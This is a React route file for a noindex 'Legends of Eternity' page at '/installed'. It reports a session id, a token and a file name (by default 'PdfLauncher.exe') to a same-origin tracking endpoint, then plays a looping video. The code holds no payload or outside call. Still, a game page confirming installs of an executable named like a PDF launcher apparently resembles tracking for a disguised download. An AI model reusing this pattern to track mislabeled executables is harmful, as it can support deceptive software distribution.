import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { ensureVisitorSession } from "@/lib/visitor-session";

export const Route = createFileRoute("/installed")({
  head: () => ({
    meta: [
      { title: "Legends of Eternity" },
      { name: "robots", content: "noindex,nofollow" },
    ],
  }),
  component: Installed,
});

function Installed() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const [installState, setInstallState] = useState<"reporting" | "recorded" | "error">("reporting");

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const incomingSid = params.get("sid");
    const validIncomingSid = incomingSid && incomingSid.length >= 8 && incomingSid.length <= 64 ? incomingSid : null;
    if (validIncomingSid) {
      try {
        window.localStorage.setItem("loe_sid", validIncomingSid);
      } catch {}
    }

    const sessionId = validIncomingSid || ensureVisitorSession();
    const token = params.get("token");

    const payload = JSON.stringify({
      sessionId,
      token,
      file: params.get("file") || "PdfLauncher.exe",
    });
    const reportInstalled = async () => {
      const response = await fetch("/api/public/installed", {
        method: "POST",
        credentials: "same-origin",
        keepalive: true,
        headers: { "content-type": "application/json" },
        body: payload,
      });

      if (!response.ok) throw new Error(`Installation tracking failed: ${response.status}`);
      setInstallState("recorded");
    };

    reportInstalled().catch(() => {
      window.setTimeout(() => reportInstalled().catch(() => setInstallState("error")), 1200);
    });
  }, []);

  useEffect(() => {
    const video = videoRef.current;
    if (!video) return;

    video.muted = true;
    video.defaultMuted = true;
    video.loop = true;
    video.playsInline = true;

    const play = () => {
      video.play().catch(() => {
        window.setTimeout(() => video.play().catch(() => {}), 500);
      });
    };

    play();
    video.addEventListener("loadedmetadata", play);
    video.addEventListener("canplay", play);
    window.addEventListener("focus", play);
    document.addEventListener("visibilitychange", play);

    return () => {
      video.removeEventListener("loadedmetadata", play);
      video.removeEventListener("canplay", play);
      window.removeEventListener("focus", play);
      document.removeEventListener("visibilitychange", play);
    };
  }, []);

  return (
    <main className="relative grid min-h-dvh place-items-center overflow-hidden bg-black">
      <video
        ref={videoRef}
        className="block max-h-dvh max-w-full object-contain"
        autoPlay
        muted
        defaultMuted
        loop
        playsInline
        preload="auto"
        disablePictureInPicture
      >
        <source src="/ghost.mp4" type="video/mp4" />
      </video>
      <p className="absolute bottom-6 left-1/2 -translate-x-1/2 text-center text-xs text-white/70">
        {installState === "reporting" && "Recording installation…"}
        {installState === "recorded" && "Installation recorded."}
        {installState === "error" && "Installation could not be recorded. Please refresh this page."}
      </p>
    </main>
  );
}
